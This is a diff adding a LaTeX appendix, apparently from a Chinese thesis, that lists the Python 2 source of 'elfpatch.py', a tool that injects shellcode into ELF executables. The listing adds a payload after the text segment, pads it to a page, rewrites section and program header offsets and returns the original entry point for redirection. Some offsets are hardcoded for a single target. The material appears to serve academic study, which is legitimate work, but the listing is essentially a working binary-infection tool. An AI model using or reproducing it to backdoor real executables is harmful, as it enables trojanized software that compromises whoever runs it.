@@ -1,0 +1,100 @@
+% !Mode:: "TeX:UTF-8"
+\chapter{ELF注入工具源代码}
+\label{python}
+%%
+\begin{enumerate}
+ \item elfpatch.py源代码
+\end{enumerate}
+\begin{lstlisting}[
+  language={python},
+]
+import struct
+import os
+import sys
+import shutil
+from elf_helper import *
+from elfbin import elfbin
+
+class elfpatch():
+    def __init__(self, FILE, OUTPUT,SHELLCODE,OBJECT_FILE):
+        self.FILE = FILE
+        self.OUTPUT = OUTPUT
+        self.bin_file = open(self.FILE, "r+b")
+        self.SHELLCODE = SHELLCODE
+        self.OBJECT_FILE = OBJECT_FILE
+        self.elfbin = elfbin(self.FILE)
+    
+    def patch_elf(self):
+        shutil.copy2(self.FILE, self.OUTPUT)
+        print "[*] Patching Binary"
+        self.bin_file = open(self.OUTPUT, "r+b")
+
+        if not self.OBJECT_FILE:
+          shellcode = to_binary_code(self.SHELLCODE)
+        else:
+          shellcode = to_binary_code(get_text_section(self.OBJECT_FILE))
+        newBuffer = len(shellcode)
+        self.bin_file.seek(24, 0)
+
+        sh_addr = 0x0
+        offsetHold = 0x0
+        sizeOfSegment = 0x0
+        shellcode_vaddr = 0x0
+        headerTracker = 0x0
+        PAGE_SIZE = 4096
+        for header, values in self.elfbin.prog_hdr.iteritems():
+            if values['p_type'] == 0x1:
+                print "[+] Found text segment"
+                shellcode_vaddr = values['p_vaddr'] + values['p_filesz']
+                oldentry = self.elfbin.e_entry
+                headerTracker = header
+                newOffset = values['p_offset'] + values['p_filesz']
+                break
+        shellcode_vaddr = 0x00308000 + 0xce186
+        newOffset = 0x000060 + 0xce186
+        self.bin_file.seek(0)
+        file_1st_part = self.bin_file.read(newOffset)
+        newSectionOffset = self.bin_file.tell()
+        file_2nd_part = self.bin_file.read()
+
+        self.bin_file.close()
+        self.bin_file = open(self.OUTPUT, "w+b")
+        self.bin_file.write(file_1st_part)
+        self.bin_file.write(shellcode)
+        self.bin_file.write("\x00" * (PAGE_SIZE - len(shellcode)))
+        self.bin_file.write(file_2nd_part)
+        if self.elfbin.EI_CLASS == 0x01:
+            self.bin_file.seek(24, 0)
+            self.bin_file.seek(8, 1)
+            self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.e_shoff + PAGE_SIZE))
+            self.bin_file.seek(self.elfbin.e_shoff + PAGE_SIZE, 0)
+            for i in range(self.elfbin.e_shnum):
+                if self.elfbin.sec_hdr[i]['sh_offset'] >= newOffset:
+                    self.bin_file.seek(16, 1)
+                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
+                    self.bin_file.seek(20, 1)
+                elif self.elfbin.sec_hdr[i]['sh_size'] + self.elfbin.sec_hdr[i]['sh_addr'] == shellcode_vaddr:
+                    self.bin_file.seek(20, 1)
+                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.sec_hdr[i]['sh_size'] + newBuffer))
+                    self.bin_file.seek(16, 1)
+                else:
+                    self.bin_file.seek(40,1)
+            after_textSegment = False
+            self.bin_file.seek(self.elfbin.e_phoff,0)
+            for i in range(self.elfbin.e_phnum):
+                if i == headerTracker:
+                    after_textSegment = True
+                    self.bin_file.seek(16, 1)
+                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.prog_hdr[i]['p_filesz'] + newBuffer))
+                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.prog_hdr[i]['p_memsz'] + newBuffer))
+                    self.bin_file.seek(8, 1)
+                elif after_textSegment is True:
+                    self.bin_file.seek(4, 1)
+                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.prog_hdr[i]['p_offset'] + PAGE_SIZE))
+                    self.bin_file.seek(24, 1)
+                else:
+                    self.bin_file.seek(32,1)
+        self.bin_file.close()
+        print "[!] Patching Complete"
+        return (oldentry,shellcode_vaddr)
+\end{lstlisting}
